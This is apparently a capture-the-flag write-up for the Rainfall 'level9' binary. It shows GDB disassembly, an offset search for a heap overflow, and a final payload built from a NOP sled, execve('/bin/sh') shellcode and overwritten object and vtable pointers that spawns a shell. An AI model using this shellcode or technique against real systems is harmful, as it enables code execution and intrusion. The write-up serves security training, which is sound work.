# Level9

First step - testing the program

	$ ./level9
	$ ./level9 coucou
	$ ./level9 coucou coucou

Nothing

Start in GDB

	(gdb-peda)$ pdisas main
	Dump of assembler code for function main:
	   0x080485f4 <+0>:		push   ebp
	   0x080485f5 <+1>:		mov    ebp,esp
	   0x080485f7 <+3>:		push   ebx
	   0x080485f8 <+4>:		and    esp,0xfffffff0
	   0x080485fb <+7>:		sub    esp,0x20
	   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
	   0x08048602 <+14>:	jg     0x8048610 <main+28>
	   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
	   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
	   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
	   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
	   0x0804861c <+40>:	mov    ebx,eax
	   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
	   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
	   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
	   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
	   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
	   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
	   0x0804863e <+74>:	mov    ebx,eax
	   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
	   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
	   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
	   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
	   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
	   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
	   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
	   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
	   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
	   0x08048667 <+115>:	add    eax,0x4
	   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
	   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
	   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
	   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
	   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
	   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
	   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
	   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
	   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
	   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
	   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
	   0x08048693 <+159>:	call   edx
	   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
	   0x08048698 <+164>:	leave
	   0x08048699 <+165>:	ret
	End of assembler dump.

It seems to be C++, try to understand the first call "_Znwj" with c++filt to be sure

	$ c++filt _Znwj                                                                     !
	operator new(unsigned int)

It's the builtin new

The program dereference EAX 2 times at main+140 and there is a call on EDX at main+159

Get all the functions

	(gdb) info function
	All defined functions:

	Non-debugging symbols:
	...
	0x08048510  memcpy
	0x08048510  memcpy@plt
	...

There is a memcpy call, we can overflow

Search the offset of the overflow with the pattern tool

	(gdb-peda)$ pattern create 200 file
	Writing pattern of 200 chars to filename "file"

	(gdb-peda)$ r $(cat file)
	Starting program: /home/nico/42/rainfall/level9/Ressources/level9 $(cat file)

	Program received signal SIGSEGV, Segmentation fault.
	....

	(gdb-peda)$ pattern search
	Registers contain pattern buffer:
	EAX+0 found at offset: 108
	...
	Registers point to pattern buffer:
	[EDX] --> offset 0 - size ~200
	...

Ok we have the offset. We can write in some registers

The offset of EAX is 108 (112 for overwrite it)

The offset of EDX is 0, first position

Try something with (4 bytes EDX) + (104 nop) + (4 bytes EAX)

	(gdb-peda)$ r $(python -c 'print "AAAA"+"\x90"*108+"BBBB"')
	Starting program: /home/nico/42/rainfall/level9/Ressources/level9 $(python -c 'print "AAAA"+"\x90"*108+"BBBB"')

	Program received signal SIGSEGV, Segmentation fault.
	[----------------------------------registers-----------------------------------]
	EAX: 0x42424242 ('BBBB')
	EBX: 0x804ec20 ("BBBB")
	....
	EDX: 0x804ebb4 ("AAAA", '\220' <repeats 104 times>, "BBBB")
	....
	Legend: code, data, rodata, value
	Stopped reason: SIGSEGV
	0x08048682 in main ()

The overwrite of EAX and EDX works. Let's do it with a shellcode

	(gdb-peda)$ r $(python -c 'print "AAAA"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"BBBB"')

Get the address of the nopsled

	gdb-peda$ x/100xh $esp+600
	0xffffd4e8:	0xd51b	0xffff	0x001a	0x0000	0x0000	0x0000	0x001f	0x0000
	0xffffd4f8:	0xdfc8	0xffff	0x000f	0x0000	0xd52b	0xffff	0x0000	0x0000
	0xffffd508:	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000	0x0000
	0xffffd518:	0x0000	0xf100	0x031c	0x492d	0xee36	0x7d6c	0x5b7b	0x510e
	0xffffd528:	0x1433	0x691b	0x3836	0x0036	0x0000	0x0000	0x0000	0x0000
	0xffffd538:	0x682f	0x6d6f	0x2f65	0x696e	0x6f63	0x342f	0x2f32	0x6172
	0xffffd548:	0x6e69	0x6166	0x6c6c	0x6c2f	0x7665	0x6c65	0x2f39	0x6552
	0xffffd558:	0x7373	0x756f	0x6372	0x7365	0x6c2f	0x7665	0x6c65	0x0039
	0xffffd568:	0x4141	0x4141	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090
	0xffffd578:	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090 <------ HERE
	0xffffd588:	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090
	0xffffd598:	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090	0x9090	0xeb90
	0xffffd5a8:	0x5e1f	0x7689	0x3108	0x88c0

Put this address (0xffffd578) on EDX, not on EAX. Because EAX can't execute this address 0xffff..

	(gdb-peda)$ r $(python -c 'print "\x78\xd5\xff\xff"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"BBBB"')
	Starting program: /home/nico/42/rainfall/level9/Ressources/level9 $(python -c 'print "\x78\xd5\xff\xff"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"BBBB"')

	Program received signal SIGSEGV, Segmentation fault.
	[----------------------------------registers-----------------------------------]
	EAX: 0x42424242 ('BBBB')
	EBX: 0x804ec20 ("BBBB")
	....
	EDX: 0x804ebb4 --> 0xffffd578 --> 0x90909090
	....
	Legend: code, data, rodata, value
	Stopped reason: SIGSEGV
	0x08048682 in main ()

Now, EDX point on the nopsled, we can put the address of EDX (0x804ebb4) on EAX, for jump in the nopesled

	gdb-peda$ r $(python -c 'print "\x78\xd5\xff\xff"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\xb4\xeb\x04\x08"')
	Starting program: /home/nico/42/rainfall/level9/Ressources/level9 $(python -c 'print "\x78\xd5\xff\xff"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\xb4\xeb\x04\x08"')
	process 16210 is executing new program: /usr/bin/dash
	$

We have the shell, but now we need to exploit on the vm, without gdb-peda for help to find EDX address

The segfault is at main+142, we put a breakpoint and inject our previous payload with AAAA on the first address position and BBBB at the second

	(gdb) b *main+142
	Breakpoint 1 at 0x8048682

	(gdb) r $(python -c 'print "AAAA"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"BBBB"')
	Starting program: /home/user/level9/level9 $(python -c 'print "AAAA"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"BBBB"')

	Breakpoint 1, 0x08048682 in main ()

We are just before the segfault, get the address of where is stored AAAA

	(gdb) x $esp
	0xbffff5b0:	0x0804a008
	(gdb) x/20xw 0x0804a008
	0x804a008:	0x08048848	0x41414141	0x90909090	0x90909090
	0x804a018:	0x90909090	0x90909090	0x90909090	0x90909090
	0x804a028:	0x90909090	0x90909090	0x90909090	0x90909090
	0x804a038:	0x90909090	0x90909090	0x90909090	0x90909090
	0x804a048:	0xeb909090	0x76895e1f	0x88c03108	0x46890746

The address is ESP+4 = 0x0804a008 + 4 = 0x0804a00c

We will put it instead of BBBB

Now, get the address of he nopsled, 0x804a028 for example

The final payload is (0x0804a028) + (nopsled) + (shellcode) + (0x0804a00c)

	$(python -c 'print "\x28\xa0\x04\x08"+"\x90"*59+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x0c\xa0\x04\x08"')
